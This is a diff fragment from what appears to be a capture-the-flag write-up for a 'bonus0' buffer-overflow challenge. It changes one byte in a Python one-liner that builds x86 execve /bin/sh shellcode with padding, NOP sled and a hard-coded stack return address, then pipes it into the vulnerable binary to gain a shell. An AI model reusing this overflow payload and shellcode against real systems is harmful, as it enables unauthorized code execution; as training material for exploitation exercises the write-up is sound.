@@ -78,6 +78,6 @@ The padding on s[58] is very important, as the pp() function will actually write
 So if we don't add the last character padding on the v3[18], it will be 19 characters long only.
 
 `
-python -c "print '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89' + 'a'*4075 + '\n\xe2\xb0\x0b\xcd\x80' + '\x90' * 9 + '\xd6\xf6\xff\xbf' + '\x90'" > /tmp/bonus0_test
+python -c "print '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89' + 'a'*4075 + '\n\xe1\xb0\x0b\xcd\x80' + '\x90' * 9 + '\xd6\xf6\xff\xbf' + '\x90'" > /tmp/bonus0_test
 cat /tmp/bonus0_test - | ./bonus
 `
